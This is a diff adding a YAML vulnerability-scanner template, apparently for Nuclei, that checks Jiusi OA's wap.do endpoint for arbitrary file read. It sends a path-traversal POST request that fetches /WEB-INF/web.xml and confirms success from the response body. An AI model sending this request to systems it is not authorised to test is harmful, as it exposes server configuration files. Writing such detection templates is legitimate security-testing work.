@@ -1,0 +1,33 @@
+id: jsoa-wap-fileread
+info:
+  name: 九思OA-wap.do-任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/commit/7e6b361e2d328ea4623b0baa68767d5e696e8a70
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: jsoa,fileread
+
+http:
+  - raw:
+      - |
+        POST /jsoa/wap.do?method=downLoad HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=../&name=&FileName=/WEB-INF/web.xml
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'web-app')
+        condition: and
